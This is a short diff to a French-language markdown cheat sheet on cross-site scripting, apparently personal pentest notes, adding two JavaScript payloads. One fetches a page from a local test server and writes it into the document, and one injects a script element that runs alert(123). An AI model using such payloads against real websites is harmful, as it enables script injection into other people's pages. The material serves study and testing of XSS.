@@ -28,7 +28,10 @@ Il est possbible d'exploiter une XSS dans un champ hidden. Voir [XSS in Hidden I
 Basé sur [Calling remote script with event handlers](https://brutelogic.com.br/blog/calling-remote-script-with-event-handlers/).
 
 ``` javascript
+// Avec la méthode fetch
 fetch('http://127.0.0.1:5000/').then(function(r){return r.text();}).then(function(w){document.write(w)});
+// Avec appendChild et createElement
+document.body.appendChild(document.createElement('script')).text = 'alert(123)';
 ```
 
 Côté serveur (avec flask):
